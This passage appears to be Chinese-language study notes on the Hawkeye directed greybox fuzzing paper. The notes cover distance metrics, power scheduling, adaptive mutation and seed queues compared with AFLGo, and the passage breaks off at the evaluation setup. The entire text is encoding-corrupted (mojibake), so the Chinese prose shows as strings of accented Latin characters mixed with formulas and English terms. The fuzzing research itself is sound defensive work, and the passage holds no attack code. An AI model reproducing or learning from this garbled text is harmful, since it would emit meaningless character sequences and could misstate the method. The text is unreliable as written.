´åæˆ–å¿½ç•¥æ›´å¥½çš„ç§å­ã€‚AFLGo ç¼ºä¹è‡ªé€‚åº”çªå˜ç­–ç•¥ã€‚ æ€»ç»“ã€‚ä»¥ AFLGo ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“ä»¥ä¸‹å‡ ç‚¹æ”¹è¿› dgf çš„å»ºè®®: (1) å¯¹äº P1ï¼Œéœ€è¦æ›´å‡†ç¡®çš„è·ç¦»å®šä¹‰ï¼Œä»¥ä¿ç•™è¿¹çš„å¤šæ ·æ€§ï¼Œé¿å…å¯¹çŸ­è¿¹çš„å…³æ³¨ã€‚ (2) å¯¹äº P2ï¼Œç›´æ¥è°ƒç”¨å’Œé—´æ¥è°ƒç”¨éƒ½éœ€è¦åˆ†æ; åœ¨é™æ€è·ç¦»è®¡ç®—è¿‡ç¨‹ä¸­ï¼Œéœ€è¦åŒºåˆ†ä¸åŒçš„å‘¼å«æ¨¡å¼ã€‚ (3) å¯¹äº P3ï¼Œéœ€è¦å¯¹å½“å‰çš„åŠŸç‡è°ƒåº¦è¿›è¡Œè°ƒèŠ‚ã€‚è·ç¦»å¼•å¯¼çš„ç§å­ä¼˜å…ˆçº§ä¹Ÿæ˜¯å¿…è¦çš„ã€‚ (4) å¯¹äº P4, DGF éœ€è¦ä¸€ç§è‡ªé€‚åº”çªå˜ç­–ç•¥ï¼Œå½“ç§å­ä¸ç›®æ ‡è·ç¦»ä¸åŒæ—¶ï¼Œæœ€ä¼˜åœ°åº”ç”¨ç»†ç²’å’Œç²—ç²’çªå˜ã€‚ 3 æ–¹æ³•æ¦‚è¿° 3.1 é™æ€åˆ†æ è¾“å…¥ä¸ºç¨‹åºæºç å’Œ target sitesï¼ˆä»¥æ‰€åœ¨åŸºæœ¬å—å’Œå‡½æ•°çš„å½¢å¼ï¼‰ é™æ€åˆ†æé˜¶æ®µè¾“å‡ºå¸¦æœ‰åŸºæœ¬å—çº§è·ç¦»ä¿¡æ¯çš„ç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶ åŒ…å«å¼æŒ‡é’ˆåˆ†æç²¾ç¡®æ„å»ºä»ªè¡¨åŒ–ç›®æ ‡ç¨‹åºçš„è°ƒç”¨å›¾ï¼Œå¯¹äºæ¯ä¸ªå‡½æ•°æ„å»ºæ§åˆ¶æµå›¾ æ ¹æ® CG å’Œ CFG è®¡ç®—å‡ ä¸ªå®ç”¨ç¨‹åºï¼Œç”¨äºä¿ƒè¿› Hawkeye ä¸­çš„å®šå‘æ€§ï¼Œå®ç”¨ç¨‹åºå¦‚ä¸‹ï¼š ï¼ˆ1ï¼‰å‡½æ•°çº§è·ç¦»æ˜¯åŸºäº CG è®¡ç®—å¢å¼ºçš„ç›¸é‚»å‡½æ•°è·ç¦»ï¼ˆÂ§4.2ï¼‰ã€‚è¿™ä¸ªè·ç¦»è¢«ç”¨æ¥è®¡ç®—åŸºæœ¬å—çº§åˆ«çš„è·ç¦»ã€‚å®ƒä¹Ÿåœ¨æ¨¡ç³Šå¾ªç¯ä¸­ç”¨äºè®¡ç®—è¦†ç›–å‡½æ•°ç›¸ä¼¼åº¦ï¼ˆÂ§4.4ï¼‰ã€‚ ï¼ˆ2ï¼‰åŸºæœ¬å—çº§åˆ«çš„è·ç¦»æ˜¯æ ¹æ®å‡½æ•°çº§åˆ«çš„è·ç¦»ã€CG å’Œå‡½æ•°çš„ CFGs è®¡ç®—å‡ºæ¥çš„ã€‚è¿™ä¸ªè·ç¦»è¢«é™æ€åœ°ä»ªè¡¨åŒ–ï¼Œç”¨äºæ¯ä¸ªè¢«è®¤ä¸ºèƒ½å¤Ÿåˆ°è¾¾ç›®æ ‡ç«™ç‚¹ä¹‹ä¸€çš„åŸºæœ¬å—ã€‚åœ¨æ¨¡ç³Šå¾ªç¯ä¸­ï¼Œå®ƒä¹Ÿè¢«ç”¨æ¥è®¡ç®—åŸºæœ¬å—è¿½è¸ªè·ç¦»ï¼ˆÂ§4.4ï¼‰ã€‚ ï¼ˆ3ï¼‰ç›®æ ‡å‡½æ•°è¿½è¸ªé—­åŒ…æ˜¯æ ¹æ® CG ä¸ºæ¯ä¸ªç›®æ ‡ç«™ç‚¹è®¡ç®—å‡ºæ¥çš„ï¼Œä»¥è·å¾—èƒ½å¤Ÿåˆ°è¾¾ç›®æ ‡ç«™ç‚¹çš„å‡½æ•°ã€‚å®ƒåœ¨æ¨¡ç³Šå¾ªç¯ä¸­ç”¨äºè®¡ç®—è¦†ç›–å‡½æ•°ç›¸ä¼¼åº¦ï¼ˆÂ§4.4ï¼‰ã€‚ æœ€åå°†åŸºæœ¬å—çº§åˆ«çš„è·ç¦»ä»ªè¡¨åŒ–æºä»£ç ï¼Œé‡æ–°ç¼–è¯‘ï¼Œå¾—åˆ°ç”¨äºæ¨¡ç³Šçš„äºŒè¿›åˆ¶ç¨‹åº 3.2 æ¨¡ç³Šå¾ªç¯ æ¨¡ç³Šå™¨ä»ä¼˜å…ˆçº§ç§å­é˜Ÿåˆ—ä¸­é€‰æ‹©ä¸€ä¸ªç§å­ï¼Œåˆ©ç”¨èƒ½é‡åˆ†é…å‡½æ•°è¿›è¡Œèƒ½é‡è°ƒåº¦\nèƒ½é‡åˆ†é…å‡½æ•°æ˜¯è¦†ç›–å‡½æ•°ç›¸ä¼¼æ€§å’ŒåŸºæœ¬å—è·Ÿè¸ªè·ç¦»çš„ç»„åˆï¼Œå¯¹äºæ¯ä¸ªåœ¨å˜å¼‚è¿‡ç¨‹ä¸­æ–°ç”Ÿæˆçš„æµ‹è¯•ç§å­ï¼Œåœ¨æ•è·å…¶æ‰§è¡Œè·Ÿè¸ªåï¼Œæ¨¡ç³Šå™¨å°†æ ¹æ®å®ç”¨ç¨‹åºï¼ˆÂ§3.1ï¼‰è®¡ç®—è¦†ç›–å‡½æ•°ç›¸ä¼¼æ€§å’ŒåŸºæœ¬å—è·Ÿè¸ªè·ç¦»ã€‚ å¯¹äºæ¯ä¸ªè¾“å…¥æ‰§è¡Œè·Ÿè¸ªï¼Œå…¶åŸºæœ¬å—è·Ÿè¸ªè·ç¦»è®¡ç®—ä¸ºç´¯ç§¯åŸºæœ¬å—çº§åˆ«è·ç¦»é™¤ä»¥æ‰§è¡ŒåŸºæœ¬å—æ€»æ•°ï¼›å…¶è¦†ç›–å‡½æ•°ç›¸ä¼¼æ€§æ ¹æ®å½“å‰æ‰§è¡Œå‡½æ•°ä¸ç›®æ ‡å‡½æ•°è·Ÿè¸ªé—­åŒ…çš„é‡å ä»¥åŠå‡½æ•°çº§åˆ«è·ç¦»è®¡ç®—ã€‚ åœ¨èƒ½é‡ç¡®å®šåï¼Œæ¨¡ç³Šå™¨æ ¹æ®å˜å¼‚å™¨å¯¹ç§å­çš„ç²’åº¦è‡ªé€‚åº”åœ°åˆ†é…ä¸¤ç§ä¸åŒç±»åˆ«çš„å˜å¼‚é¢„ç®—ï¼ˆÂ§4.5ï¼‰ã€‚ç„¶åï¼Œæ¨¡ç³Šå™¨è¯„ä¼°æ–°ç”Ÿæˆçš„ç§å­ï¼Œä¼˜å…ˆè€ƒè™‘é‚£äº›å…·æœ‰æ›´å¤šèƒ½é‡æˆ–å·²è¾¾åˆ°ç›®æ ‡å‡½æ•°çš„ç§å­ï¼ˆÂ§4.6ï¼‰ã€‚\n4æ–¹æ³• 4.1 å›¾çš„æ„å»º å¯¹æ•´ä¸ªç¨‹åºçš„å‡½æ•°æŒ‡é’ˆåº”ç”¨åŸºäºåŒ…å«çš„æŒ‡é’ˆåˆ†ææ¥ç”Ÿæˆ CG ç›®çš„ï¼šè¯†åˆ«ç¨‹åºçš„é—´æ¥è°ƒç”¨ æ–¹æ³•ï¼šè¿™ç§ç®—æ³•çš„æ ¸å¿ƒæ€æƒ³æ˜¯å°†è¾“å…¥ç¨‹åºä¸­å½¢å¦‚ p := q çš„è¯­å¥è½¬æ¢ä¸ºå½¢å¦‚â€œq çš„ points-to é›†åˆæ˜¯ p çš„ points-to é›†åˆçš„å­é›†â€çš„çº¦æŸã€‚è®¡ç®—äº†æ•´ä¸ªç¨‹åºå†…å‡½æ•°æŒ‡é’ˆçš„ points-to é›†åˆï¼Œä»è€Œå¾—åˆ°ä¸€ä¸ªåŒ…å«æ‰€æœ‰å¯èƒ½ç›´æ¥å’Œé—´æ¥è°ƒç”¨çš„ç›¸å¯¹ç²¾ç¡®è°ƒç”¨å›¾ã€‚ï¼ˆè¿™ç§æ–¹æ³•æ˜¯ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿå’Œæµä¸æ•æ„Ÿçš„ï¼‰ è°ƒç”¨å›¾ç”¨æˆ·è®¡ç®—å‡½æ•°çº§è·ç¦» åŸºäº LLVM çš„ IR ç”Ÿæˆæ¯ä¸ªå‡½æ•°çš„ CFG CG è®¡ç®—å‡½æ•°çº§è·ç¦» CFG+CG è®¡ç®—åŸºæœ¬å—è·ç¦» 4.2 å¢å¼ºçš„ç›¸é‚»å‡½æ•°è·ç¦» ä½œè€…è®¤ä¸ºåœ¨è®¡ç®—è·ç¦»çš„æ—¶å€™åº”è¯¥è€ƒè™‘è¢«è°ƒå‡½æ•°çš„è°ƒç”¨æ¨¡å¼ï¼ˆæ¦‚ç‡ï¼‰ï¼Œæ¦‚ç‡è¶Šå¤§ï¼Œè·ç¦»åº”å½“è¶Šè¿‘ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œa ä¸­çš„ fb è‚¯å®šä¼šè¢«è°ƒç”¨ï¼Œè€Œ b ä¸­çš„ fb å’Œ fc çš„è°ƒç”¨æ¦‚ç‡ç›¸åŒã€‚æ‰€ä»¥ a ä¸­ fa åˆ° fb çš„è·ç¦»è¦è¿‘äº fcï¼Œb ä¸­ fa åˆ° fb å’Œ fc çš„è·ç¦»ç›¸åŒã€‚ ä½œè€…æå‡ºä¸¤ä¸ªæŒ‡æ ‡æ¥å¢å¼ºç›´æ¥è°ƒç”¨çš„è·ç¦»\n$\\Phi(C_N)=\\frac{\\phiC_N+1}{\\phiC_N}$ $C_N$ æ˜¯æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„è°ƒç”¨ç‚¹å‡ºç°æ¬¡æ•°ï¼Œæ¬¡æ•°è¶Šå¤§è·ç¦»è¶Šå°ï¼ˆ$\\Phi(C_N)$ ç”¨æ¥è¡¨ç¤ºè¿™ç§æ•ˆåº”ï¼‰ï¼Œå…¶ä¸­Ï†æ˜¯ä¸€ä¸ªå¸¸æ•°å€¼ï¼ˆé€šå¸¸Ï†= 2ï¼‰ $\\Psi (C_B)=\\frac{\\psiC_B+1}{\\psiC_B}$ $C_B$ æ˜¯è°ƒç”¨å‡½æ•°åŒ…å«è‡³å°‘ä¸€ä¸ªè°ƒç”¨ç‚¹çš„åŸºæœ¬å—çš„æ•°é‡ï¼Œå½“æ‹¥æœ‰è°ƒç”¨ç‚¹çš„åˆ†æ”¯è¶Šå¤šï¼ŒåŒ…æ‹¬è¢«è°ƒå‡½æ•°çš„æ‰§è¡Œè·Ÿè¸ªä¹Ÿè¶Šå¤š ï¼ˆ$\\Psi(C_B)$ æ¥è¡¨ç¤ºè¿™ç§æ•ˆåº”ï¼‰ï¼ŒÏˆæ˜¯ä¸€ä¸ªå¸¸æ•°å€¼ï¼ˆé€šå¸¸Ïˆ= 2ï¼‰ã€‚ è¿™ä¸¤ä¸ªå› å­éƒ½æ˜¯å•è°ƒé€’å‡å‡½æ•°ï¼Œéšç€ $C_Bã€C_N$ å¢å¤§é€æ¸æ”¶æ•›åˆ° 1 ç»™å®šä¸€ä¸ªç›´æ¥å‡½æ•°è°ƒç”¨å¯¹ï¼ˆf1ï¼Œf2ï¼‰ï¼Œå…¶ä¸­ f1 æ˜¯è°ƒç”¨è€…ï¼Œf2 æ˜¯è¢«è°ƒç”¨è€…ï¼Œåˆ™ f1 å’Œ f2 ä¹‹é—´çš„åŸå§‹è·ç¦»ä¸º 1ï¼Œé¦–å…ˆè®¡ç®—å› å­ $\\Phi å’Œ\\Psi$ï¼Œç„¶åç›¸ä¹˜å¾—åˆ°æˆ‘ä»¬çš„è°ƒæ•´å› å­ï¼Œè°ƒæ•´å› å­ä¹˜ä¸Š AFL è®¡ç®—çš„è·ç¦»å°±æ˜¯æœ€ç»ˆç»“æœ ${d}\u0026rsquo; f (f1, f2) = Î¨(f1, f2) Â· Î¦(f1, f2) (1)$ 4.3 æŒ‡å‘æ€§æ•ˆç”¨è®¡ç®— å‡½æ•°çº§è·ç¦» ç»™å®šä¸€ä¸ªå‡½æ•° nï¼Œå®ƒåˆ°ç›®æ ‡å‡½æ•°é›†åˆ $T_f$ çš„è·ç¦»ä¸ºï¼š $R(n,T_f)={t_f|reachable(n,t_f)}$ï¼Œè¡¨ç¤ºåœ¨ CG ä¸­ n èƒ½åˆ°è¾¾çš„ tf çš„é›†åˆï¼Œå¹¶ä¸” df æ˜¯åŸºäºå¢å¼ºè·ç¦»çš„è¿ªæ°ç‰¹æ–¯æ‹‰æœ€çŸ­è·¯å¾„\nåŸºæœ¬å—çº§è·ç¦» ç»™å®šä¸€ä¸ªåŸºæœ¬å— mï¼Œå®ƒåˆ°ç›®æ ‡åŸºæœ¬å— Tb çš„è·ç¦»å®šä¹‰ä¸ºï¼š å¦‚æœåŸºæœ¬å— m å±äºç›®æ ‡åŸºæœ¬å— Tbï¼Œè·ç¦»ä¸ºé›¶ å¦‚æœåŸºæœ¬å— m å±äº Transbï¼Œè·ç¦»ä¸ºå±äº $C_f^T(m)$ çš„å‡½æ•°åˆ°ç›®æ ‡å‡½æ•°çš„æœ€å°å€¼ä¸ c çš„ä¹˜ç§¯ åœ¨åŸºæœ¬å— m å†…è°ƒç”¨çš„å‡½æ•°é›†åˆè¡¨ç¤ºä¸º Cf (m)ï¼Œ$C_f^T(m)={n|R(n, Tf)\\neâˆ…,nâˆˆC_f(m)}$ï¼Œ$C_f^T(m)$ æ˜¯åŸºæœ¬å— m ä¸­çš„å¯è¾¾ç›®æ ‡å‡½æ•°çš„å‡½æ•°çš„é›†åˆ $Trans_b={m|âˆƒG(n),mâˆˆG(n),nâˆˆF,C_f^T(m)\\neâˆ…}$ Transb å’Œ CTf äº’ä¸ºâ€œå€’æ•°â€å§ï¼ŒTransb è¡¨ç¤ºå«æœ‰å¯è¾¾ç›®æ ‡å‡½æ•°çš„å‡½æ•°çš„åŸºæœ¬å—çš„é›†åˆ å¦åˆ™è·ç¦»éœ€è¦é€šè¿‡ä¸€ä¸ªä¸­é—´åŸºæœ¬å— t æ¥é—´æ¥åˆ°è¾¾ $d_{b}^{o}(m1,m2)$ å®šä¹‰ä¸ºåœ¨ CFG G (n) ä¸­ä» m1 åˆ° m2 çš„æœ€å°è¾¹æ•° è¯·æ³¨æ„ï¼Œæ–¹ç¨‹ 2 å’Œ 3 æœ¬èº«ä¸ AFLGo [6]ä¸­çš„ç›¸åŒã€‚åŒºåˆ«åœ¨äº df çš„è®¡ç®—æ˜¯å¢å¼ºçš„ã€‚\nç›®æ ‡å‡½æ•°è·Ÿè¸ªé—­åˆ å®ç”¨ç¨‹åºÎ¾fï¼ˆTfï¼‰è¡¨ç¤ºç›®æ ‡å‡½æ•° Tf çš„æ‰€æœ‰å‰ä»»ï¼Œç”±äºé™æ€åˆ†æçš„å±€é™æ€§ï¼Œæˆ‘ä»¬é€‰æ‹©ä¸æ’é™¤é‚£äº›è¢«è®¤ä¸ºæ— æ³•ä»å…¥å£å‡½æ•°åˆ°è¾¾çš„å‰ä»»ã€‚\n4.4 èƒ½é‡è°ƒåº¦ åŸºæœ¬å—è·Ÿè¸ªè·ç¦» ç§å­ s åˆ°ç›®æ ‡åŸºæœ¬å— Tb çš„è·ç¦»å®šä¹‰ä¸ºï¼š å…¶ä¸­Î¾b (s) æ˜¯ç§å­ s çš„æ‰§è¡Œè·Ÿè¸ªï¼ŒåŒ…å«æ‰€æœ‰æ‰§è¡Œçš„åŸºæœ¬å—ã€‚ æ–¹ç¨‹ 4 çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šå¯¹äº s çš„æ‰§è¡Œè·Ÿè¸ªä¸­çš„æ‰€æœ‰åŸºæœ¬å—ï¼Œæˆ‘ä»¬è®¡ç®—åˆ°ç›®æ ‡åŸºæœ¬å— Tb çš„å¹³å‡åŸºæœ¬å—çº§è·ç¦»ã€‚è¯·æ³¨æ„ï¼Œæ–¹ç¨‹ 4 ä¹Ÿä¸ AFLGo [6]ä¸­çš„ç›¸åŒã€‚ ç„¶ååº”ç”¨ç‰¹å¾ç¼©æ”¾å½’ä¸€åŒ–æ¥è·å¾—æœ€ç»ˆè·ç¦»ï¼š ï¼Œå…¶ä¸­ minDï¼ˆæˆ– maxDï¼‰æ˜¯æ›¾ç»é‡åˆ°çš„æœ€å°ï¼ˆæˆ–æœ€å¤§ï¼‰è·ç¦»ã€‚\nè¦†ç›–å‡½æ•°ç›¸ä¼¼åº¦ã€‚ åº¦é‡è¡¡é‡ç§å­çš„æ‰§è¡Œè·Ÿè¸ªä¸ç›®æ ‡æ‰§è¡Œè·Ÿè¸ªåœ¨å‡½æ•°çº§åˆ«ä¸Šçš„ç›¸ä¼¼æ€§ã€‚ æˆ‘ä»¬ä¸è·Ÿè¸ªåŸºæœ¬å—çº§åˆ«çš„è·Ÿè¸ªç›¸ä¼¼æ€§ï¼Œå› ä¸ºè¿™ä¼šå¼•å…¥ç›¸å½“å¤§çš„å¼€é”€ã€‚ æ ¹æ®ç›´è§‰è®¡ç®—ç›¸ä¼¼æ€§ï¼Œå³è¦†ç›–â€œé¢„æœŸè·Ÿè¸ªâ€ä¸­æ›´å¤šå‡½æ•°çš„ç§å­å°†æœ‰æ›´å¤šæœºä¼šè¢«çªå˜ä»¥åˆ°è¾¾ç›®æ ‡ã€‚é€šè¿‡è·Ÿè¸ªå½“å‰ç§å­è¦†ç›–çš„å‡½æ•°é›†ï¼ˆè®°ä¸ºÎ¾f (s)ï¼‰å¹¶å°†å…¶ä¸ç›®æ ‡å‡½æ•°è·Ÿè¸ªé—­åŒ…Î¾f (Tf) è¿›è¡Œæ¯”è¾ƒæ¥è®¡ç®—æ­¤ç›¸ä¼¼æ€§ã€‚åœ¨å›¾ 2 ä¸­ï¼ŒÎ¾f (abcdTZ)={a, b, c, d, T}ï¼ŒÎ¾f (aeTZ)={a, e, T}å’ŒÎ¾f (aefZ)={a, e}ã€‚\ndf (f , Tf ) æ˜¯ä½¿ç”¨æ–¹ç¨‹ 2 è®¡ç®—çš„å‡½æ•°çº§è·ç¦»ã€‚ä¸ ds ç±»ä¼¼ï¼Œä¹Ÿåº”ç”¨äº†ç‰¹å¾ç¼©æ”¾å½’ä¸€åŒ–ï¼Œå¹¶ä¸”æœ€ç»ˆç›¸ä¼¼åº¦è¡¨ç¤ºä¸º cs ã€‚è¯·æ³¨æ„ï¼Œè¿™ç§ç›¸ä¼¼åº¦åº¦é‡æ˜¯æˆ‘ä»¬æ–¹æ³•ä¸­ç‹¬ç‰¹æå‡ºçš„ã€‚\nè°ƒåº¦ è°ƒåº¦å¤„ç†çš„é—®é¢˜æ˜¯ç»™å®šç§å­å°†è¢«åˆ†é…å¤šå°‘å˜å¼‚æœºä¼šã€‚ å¦‚æœå½“å‰ç§å­çš„æ‰§è¡Œè½¨è¿¹å’Œè¾¾åˆ°ç›®æ ‡ç‚¹çš„ä»»ä½•è½¨è¿¹è¶Šç›¸ä¼¼ï¼Œåˆ™ä¼šè¢«åˆ†é…åˆ°çš„èƒ½é‡è¶Šå¤šã€‚ ä½†æ˜¯ï¼Œçº¯ç²¹åŸºäºè·Ÿè¸ªè·ç¦»çš„è°ƒåº¦å¯èƒ½ä¼šåçˆ±æŸäº›è·Ÿè¸ªæ¨¡å¼ã€‚å¯¹äº AFLGoï¼Œå¦‚Â§2.2.2 æ‰€è¿°ï¼Œè¾ƒçŸ­è·¯å¾„å°†è¢«åˆ†é…æ›´å¤šèƒ½é‡ï¼Œè¿™å¯èƒ½ä¼šä½¿ä»ç„¶å¯åˆ°è¾¾ç›®æ ‡ç«™ç‚¹çš„è¾ƒé•¿è·¯å¾„é¥¥é¥¿ã€‚ ä¸ºäº†ç¼“è§£è¿™ç§æƒ…å†µï¼Œä½œè€…æå‡ºäº†ä¸€ç§è€ƒè™‘äº†è·Ÿè¸ªè·ç¦»ï¼ˆåŸºäºåŸºæœ¬å—çº§åˆ«è·ç¦»ï¼‰å’Œè·Ÿè¸ªç›¸ä¼¼æ€§ï¼ˆåŸºäºè¦†ç›–å‡½æ•°ç›¸ä¼¼æ€§ï¼‰çš„å¹‚å‡½æ•°ï¼š ä¸ AFLGO çš„æ–¹æ³•ç›¸æ¯”ï¼Œè¯¥å‡½æ•°å¹³è¡¡äº†å¯ä»¥åˆ°è¾¾ç›®æ ‡çš„è¾ƒçŸ­è·¯å¾„å’Œè¾ƒé•¿è·¯å¾„çš„å½±å“\nds ç”± CG å’Œ CFG è®¡ç®—ï¼Œä½†æ˜¯ä¸»è¦å— CG å½±å“ï¼Œå› ä¸ºæœ‰æ”¾å¤§æ´—æ¼± cï¼›cs ä»…ç”± CG è®¡ç®— ds ä¸æƒ©ç½šä¸ä¼šå¯¼è‡´ç›®æ ‡çš„è·Ÿè¸ªï¼Œè€Œ cs é€šè¿‡ Î¾f (s)ï¼ˆé€šè¿‡è·Ÿè¸ªå‡½æ•°çº§åˆ«è·Ÿè¸ªï¼‰å’Œ Î¾f (Tf ) çš„å¹¶é›†æ¥æƒ©ç½šå®ƒä»¬ ç»™å®šå¤šä¸ªå¯ä»¥åˆ°è¾¾ç›®æ ‡çš„è·Ÿè¸ªï¼Œds åçˆ±é•¿åº¦çŸ­çš„é‚£äº›ï¼Œä½† cs åçˆ±é¢„æœŸè·Ÿè¸ªä¸­å…¬å…±å‡½æ•°é•¿åº¦è¾ƒé•¿çš„é‚£äº›ã€‚ ä½œè€…æŒ‡å‡ºè¯¥å‡½æ•°ä¹Ÿå­˜åœ¨åå‘æŸäº›è·¯å¾„çš„é—®é¢˜ï¼Œè¯¥å‡½æ•°ä¼šå¯¹ä¸åˆ°è¾¾ç›®æ ‡å‡½æ•°çš„æ‰§è¡Œè½¨è¿¹æ›´ç›¸ä¼¼çš„ç§å­ï¼Œå³ä½¿æ— æ³•åˆ°è¾¾ç›®æ ‡å‡½æ•°ï¼Œåˆ†é…æ›´å¤šèƒ½é‡ï¼Œä½†æ˜¯ä½œè€…è®¤ä¸ºè¿™ä¸æ˜¯é—®é¢˜ï¼Œå› ä¸ºæ­¤ç±»ç§å­å³ä½¿ä¸ä¼šåˆ°è¾¾ç›®æ ‡ï¼Œä½†æ˜¯æ›´å®¹æ˜“å˜å¼‚ä¸ºå¯ä»¥åˆ°è¾¾ç›®æ ‡å‡½æ•°çš„ç§å­ã€‚\n4.5 é€‚åº”æ€§çªå˜ ä¸Šä¸€èŠ‚è®¡ç®—å¾—åˆ°çš„èƒ½é‡ï¼ˆä¹Ÿç§°ä¸ºåº”ç”¨çªå˜çš„æ¬¡æ•°ï¼‰å°†ä¼šä½œä¸ºå˜å¼‚ç­–ç•¥çš„è¾“å…¥ã€‚ä½†æ˜¯æ¯ç§ç±»å‹çš„çªå˜å™¨çš„çªå˜æ¬¡æ•°åˆ†é…ä»æ˜¯é—®é¢˜ï¼ˆä¸¤ç§ç±»å‹çªå˜å™¨ï¼Œç²—ç²’åº¦å’Œç»†ç²’åº¦ï¼‰\nå¯¹äºç²—ç²’åº¦ï¼š\næ··åˆå˜å¼‚ï¼šä»¥ä¸‹æ“ä½œçš„ç»„åˆ åˆ é™¤ä¸€å—å­—èŠ‚ï¼Œç”¨ç¼“å†²åŒºä¸­å…¶ä»–å­—èŠ‚è¦†ç›–ç»™å®šå— åˆ é™¤æŸäº›è¡Œ å¤šæ¬¡å¤åˆ¶æŸäº›è¡Œ è¯­ä¹‰çªå˜ï¼šå½“ç›®æ ‡ç¨‹åºå·²çŸ¥å¤„ç†è¯­ä¹‰ç›¸å…³è¾“å…¥æ–‡ä»¶ï¼ˆå¦‚ javascriptã€xmlã€css ç­‰ï¼‰æ—¶ä½¿ç”¨ã€‚å…¶ä¸­åŒ…æ‹¬ä¸‰ç§å…ƒçªå˜ï¼Œåœ¨éšæœº AST ä½ç½®æ’å…¥å¦ä¸€ä¸ªå­æ ‘ã€åˆ é™¤ç»™å®š AST å’Œç”¨å¦ä¸€ä¸ª AST æ›¿æ¢ç»™å®šä½ç½®ã€‚ æ‹¼æ¥ï¼šé˜Ÿåˆ—ä¸­ä¸¤ä¸ªç§å­çš„äº¤å‰å’Œåç»­çš„æ··åˆå˜å¼‚ ç®—æ³•å¤§æ„æ˜¯åˆ¤æ–­å‡½æ•°æ˜¯å¦å¯ä»¥åˆ°è¾¾ç›®æ ‡å‡½æ•°ï¼Œå¦‚æœä¸èƒ½ï¼Œåˆ™ç²—ç²’åº¦å˜å¼‚çš„æ¯”é‡è¦å¤§ä¸€ç‚¹ï¼Œå¦‚æœå¯ä»¥ç»†ç²’åº¦å˜å¼‚çš„æ¯”é‡å¤§ä¸€ç‚¹ã€‚ä¸è¿‡æ— è®ºæ˜¯å¦å¯ä»¥åˆ°è¾¾ç›®æ ‡å‡½æ•°ï¼Œç§å­éƒ½éœ€è¦è¿›è¡Œç²—ç»†ç²’åº¦çš„å˜å¼‚ã€‚Getscore å‡½æ•°å°±æ˜¯æ–¹ç¨‹ 6 ç®—æ³• 2 æè¿°äº†ç²—ç²’åº¦å˜å¼‚çš„ç®—æ³•ï¼Œç»™å®šç§å­ s å’Œå˜å¼‚è¿­ä»£æ¬¡æ•° iï¼Œå¯¹ç§å­è¿›è¡Œæ··åˆå˜å¼‚å’Œæ‹¼æ¥ï¼Œåœ¨å¿…è¦çš„æƒ…å†µä¸‹è¿›è¡Œè¯­ä¹‰çªå˜ï¼Œå¹¶ä¸”é™ä½å¦å¤–ä¸¤ç§ç¼–è¯‘çš„æ¯”ä¾‹ã€‚ä½œè€…ç»™å‡ºäº†è¿›è¡Œè¯­ä¹‰çªå˜çš„æ¡ä»¶ï¼š\næ£€æµ‹åˆ°è¾“å…¥æ–‡ä»¶æ˜¯è¯­ä¹‰ç›¸å…³çš„è¾“å…¥æ–‡ä»¶ï¼Œå¦‚ javascriptã€xmlã€css ç­‰ å…ˆå‰çš„è¯­ä¹‰å˜å¼‚æ²¡æœ‰å¤±è´¥ åœ¨å®è·µä¸­ï¼Œå¸¸æ•°åˆ†é…ç»éªŒå€¼ï¼šÎ³ = 0.1ï¼ŒÎ´ = 0.4ï¼ŒÏƒ = 0.2ï¼ŒÎ¶ = 0.8ã€‚ ï¼ˆå¯¹äºç»†ç²’åº¦çš„å˜å¼‚ï¼Œä½œè€…é‡‡ç”¨äº†ä¸€èˆ¬çš„æ–¹æ³•ï¼‰\n4.6 ç§å­ä¼˜å…ˆçº§ ä½œè€…è®¤ä¸ºå› ä¸ºé™æ€åˆ†æçš„å±€é™æ€§ï¼Œç§å­çš„ä¼˜å…ˆç­‰çº§å¯èƒ½ä¼šæœ‰åå·®ï¼Œå¹¶ä¸”é˜Ÿåˆ—çš„æ’å…¥ç®—æ³•ä»£ä»·æ˜‚è´µï¼Œå®è·µä¸­å¹¶ä¸å®ç”¨ã€‚å› æ­¤ä½œè€…å»ºç«‹äº†ä¸‰ä¸ªé˜Ÿåˆ—ï¼Œä¼˜å…ˆçº§ä¾æ¬¡é™ä½ï¼Œé˜Ÿåˆ—ä¸­æ²¡æœ‰ä¼˜å…ˆçº§ã€‚ å½“æ–°ç§å­å¯ä»¥è¦†ç›–æ–°çš„è½¨è¿¹æˆ–è€…ä¸ç›®æ ‡ç§å­å…·æœ‰æ›´å¤§çš„ç›¸ä¼¼æ€§å€¼ï¼ˆå³åŠŸç‡å‡½æ•°å€¼ï¼‰æˆ–è€…å¯ä»¥åˆ°è¾¾ç›®æ ‡å‡½æ•°å¼ï¼Œæ”¾åˆ°ç¬¬ä¸€é˜Ÿåˆ—ï¼Œå…·æœ‰æœ€é«˜ä¼˜å…ˆçº§ å¦åˆ™æ–°ç§å­æ”¾åˆ°ç¬¬äºŒé˜Ÿåˆ— ä¸æ˜¯æ–°ç§å­çš„ç§å­æ”¾åˆ°ç¬¬ä¸‰é˜Ÿåˆ— åœ¨å®è·µä¸­ï¼ŒHawkeye è¿˜åº”ç”¨ AFL çš„å¾ªç¯æ¡¶æ–¹æ³•ï¼ˆè§[49]ï¼‰æ¥è¿‡æ»¤æ‰å¤§é‡åœ¨å¾ªç¯è¿­ä»£æ–¹é¢ä¸å¸¦æ¥æ–°è¦†ç›–ç‡çš„â€œç­‰æ•ˆâ€ç§å­ã€‚ 5 è¯„ä¼° é™æ€æ£€æµ‹åŸºäº AFL çš„ LLVM æ¨¡å¼ æŒ‡é’ˆåˆ†æåŸºäº SVF çš„è¿‡ç¨‹é—´é™æ€å€¼æµåˆ†æå·¥å…· åŠ¨æ€æ¨¡ç³Šå™¨åŸºäºæˆ‘ä»¬çš„ Rust å®ç°çš„ AFLã€‚åŸºç¡€æ¡†æ¶ï¼Œç§°ä¸º Fuzzing Orchestration Toolkit Hawkeye çš„æ£€æµ‹åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†ï¼š1ï¼‰è·Ÿè¸ªæ‰§è¡Œè½¨è¿¹çš„åŸºæœ¬å— ID 2ï¼‰ç¡®å®šåŸºæœ¬å—è½¨è¿¹è·ç¦»çš„åŸºæœ¬å—è·ç¦»ä¿¡æ¯ 3ï¼‰è·Ÿè¸ªå·²è¦†ç›–å‡½æ•°çš„å‡½æ•° IDã€‚ 5.1 è¯„ä¼°è®¾ç½® 